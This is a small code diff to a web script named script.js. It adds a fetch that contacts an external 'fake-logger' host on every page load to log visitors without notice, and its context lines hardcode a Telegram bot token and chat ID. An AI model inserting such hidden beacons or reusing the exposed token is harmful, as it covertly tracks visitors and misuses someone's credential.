@@ -1,3 +1,7 @@
+fetch("https://fake-logger.onrender.com/logger.php")
+  .then(res => console.log("Visitor logged"))
+  .catch(err => console.error("Logging failed", err));
+
 // script.js
 const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
 const CHAT_ID = '6602027873';
